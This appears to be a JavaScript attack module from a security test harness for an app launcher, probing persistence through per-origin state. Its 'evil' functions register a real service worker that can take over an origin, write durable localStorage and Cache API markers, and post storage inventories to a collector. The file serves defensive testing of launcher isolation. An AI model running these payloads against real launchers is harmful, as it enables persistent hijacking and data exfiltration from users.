// evil-07 — persistence (tier 2). NAPP.md: "Each napp has its own origin,
// so localStorage is its own" — and a real origin is durable state: the
// service-worker slot, IndexedDB, the Cache API, localStorage, all scoped to
// the napp's origin and all surviving launcher reloads (until the launcher
// wipes the origin, which is launcher policy, not protocol).
//
// The reference launcher defends the SW slot by STUBBING registration in
// bridge.js (unconditionally) — and its boot.html actively unregisters any
// foreign SW, which only makes sense BECAUSE a napp can register one while
// `network` is granted (the LOCKED_CSP's worker-src 'none' holds it only
// while locked). Validated from source; the harness's swstub knob models a
// launcher that doesn't stub, and the at-launcher knob models the origin
// mistake that makes registration real and effective.
window.__EVIL_KIT__ = [
  {
    label: 'the shipped service worker',
    note: 'A real, committed sw file in the napp\'s own folder. Under the at-launcher-origin mistake the path exists at the launcher origin; register() claims the scope and the bytes are served from then on by the attacker. Even where the SW pipeline holds (files live behind the launcher\'s SW), the register() call still happens for real in an unstubbed launcher — only the missing bytes hold it.',
    data: { script: '/napps/evil-07-persistence/evil07-sw.js', scope: '/napps/evil-07-persistence/', survives: 'launcher reloads, napp uninstall (until the origin is wiped)' },
  },
  {
    label: 'what the reference actually does (from source)',
    note: 'bridge.js stubs navigator.serviceWorker.register unconditionally; boot.html unregisterForeignSWs() tears down any SW the napp registered while network was granted; LOCKED_CSP carries worker-src \'none\'. Every one of those is launcher policy — the protocol says nothing about the SW slot.',
    data: { bridgeStub: true, bootUnregister: true, lockedWorkerSrc: 'none' },
  },
];

const MARKER_KEY = '__evil07_persist__';
const CACHE_NAME = '__evil07_cache__';
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

const ATTACKS = [
  {
    id: 'sw-slot',
    name: 'service-worker slot',
    target: 'the origin\'s single SW slot — reference: stubbed in bridge.js',
    severity: 'critical',
    destructive: true,
    harm: 'A napp that registers a service worker at its origin (or, under the at-launcher mistake, at the LAUNCHER origin) owns that scope persistently: it serves its own bytes for every later load, survives launcher reloads, and — at the launcher origin — sits behind the launcher\'s own cookies and storage.',
    evilBrief: 'Registers the REAL shipped service worker (napps/evil-07-persistence/evil07-sw.js) — where the bytes exist (the at-launcher mistake) this is a live persistent worker at the launcher origin; it then fetches through the scope to prove its bytes are served. DESTRUCTIVE (persisted): runs LAST; unregister from DevTools or the launcher.',
    async demo() {
      if (!('serviceWorker' in navigator) || !navigator.serviceWorker || !navigator.serviceWorker.register) {
        return na('navigator.serviceWorker unavailable in this frame');
      }
      // The tell: registering a script that does not exist. A STUBBED
      // register resolves with a fake registration (scope = origin root);
      // a REAL one rejects for lack of bytes. ROE: no real SW is registered
      // in demo mode.
      try {
        const reg = await navigator.serviceWorker.register('/__evil07_nonexistent_sw__.js');
        const scope = reg && (reg.scope || (reg.installing && reg.installing.scriptURL)) || '?';
        return blocked('register() RESOLVED without any script (scope ' + mask(scope, 40) + ') — the launcher stubs registration: the origin\'s SW slot stays owned by the launcher (the reference behavior)');
      } catch (e) {
        const m = errMsg(e);
        if (/404|not found|Script|failed|network|cannot|error|unsupported/i.test(m)) {
          return armed('registration was ATTEMPTED FOR REAL — rejected only for lack of bytes at my origin (' + m.slice(0, 60) + '). The slot is open: wherever a napp\'s bytes are directly reachable (the at-launcher mistake, or any origin serving its files), it owns the origin persistently');
        }
        return blocked('registration refused: ' + m.slice(0, 90));
      }
    },
    async evil() {
      const out = {};
      try {
        const url = '/napps/evil-07-persistence/evil07-sw.js';
        const reg = await navigator.serviceWorker.register(url);
        out.registered = true;
        out.scope = reg.scope || '?';
        // give the worker a moment to activate + claim
        await sleep(800);
        try {
          const res = await fetch('/napps/evil-07-persistence/probe.txt', { cache: 'no-store' });
          out.servedByEvilSW = (await res.text()).slice(0, 90);
        } catch (e) { out.fetchError = errMsg(e); }
      } catch (e) {
        out.registered = false;
        out.error = errMsg(e);
      }
      return out;
    },
  },
  {
    id: 'origin-persist',
    name: 'per-origin storage survives the launcher',
    target: 'NAPP.md: "Each napp has its own origin, so localStorage is its own"',
    severity: 'high',
    harm: 'The origin grant is durable state: a marker written now outlives the launcher session, survives reloads and re-launches, and nothing but a launcher-side wipe removes it. Persistence is a first-class NAPP capability.',
    evilBrief: 'Writes a timestamped marker key to the origin (survives launcher reloads until the origin is wiped) and POSTs the storage inventory to the collector. The demo writes one documented marker too — persistence IS the finding; wipe the app to remove it.',
    async demo() {
      try {
        const prior = localStorage.getItem(MARKER_KEY);
        if (prior) {
          return armed('my marker SURVIVED a launcher reload — written ' + prior + ', still here. Per-origin storage is durable by design: only a launcher-side wipe removes it (wipe this app to clean the marker)');
        }
        localStorage.setItem(MARKER_KEY, new Date().toISOString());
        return armed('marker written to my origin now — reload the launcher and watch it survive. Per-origin storage is durable by design (this one documented marker persists until you wipe the app)');
      } catch (e) {
        return blocked('localStorage unreachable: ' + errMsg(e).slice(0, 80));
      }
    },
    async evil() {
      const out = {};
      try {
        localStorage.setItem(MARKER_KEY, new Date().toISOString());
        out.marker = MARKER_KEY;
        const keys = [];
        for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
        out.keys = keys;
      } catch (e) { out.error = errMsg(e); }
      out.exfil = await sendToCollector('origin-persist-inventory', { keys: out.keys });
      return out;
    },
  },
  {
    id: 'caches-persist',
    name: 'Cache API persistence',
    target: 'the Cache Storage at the napp\'s origin — durable, unpoliced',
    severity: 'info',
    harm: 'caches.open() gives the napp a durable, origin-scoped store that no permission system names: it survives reloads, holds arbitrary bytes, and serves them to the origin\'s documents. Not a misconfig — a granted capability nobody talks about.',
    evilBrief: 'Stashes a marker response in a named cache at the origin and POSTs the cache inventory to the collector. The demo also writes one documented marker cache entry (delete via DevTools → Application → Cache Storage).',
    async demo() {
      if (typeof caches === 'undefined' || !caches.open) return na('Cache API unavailable in this frame');
      try {
        const c = await caches.open(CACHE_NAME);
        await c.put(new Request('/__evil07_marker__'), new Response('evil-07 cache marker ' + new Date().toISOString()));
        const keys = await c.keys();
        return armed('a durable cache exists at my origin (' + keys.length + ' entr[ies]) — survives reloads, no permission system names it (delete via DevTools → Cache Storage, or wipe the app)');
      } catch (e) {
        return blocked('cache write refused: ' + errMsg(e).slice(0, 80));
      }
    },
    async evil() {
      const out = {};
      try {
        const c = await caches.open(CACHE_NAME);
        await c.put(new Request('/__evil07_stash__'), new Response('evil-07 stashed ' + Date.now()));
        const names = await caches.keys();
        out.cacheNames = names;
        out.entries = await (await caches.open(CACHE_NAME)).keys();
      } catch (e) { out.error = errMsg(e); }
      out.exfil = await sendToCollector('caches-persist-inventory', { names: out.cacheNames });
      return out;
    },
  },
];
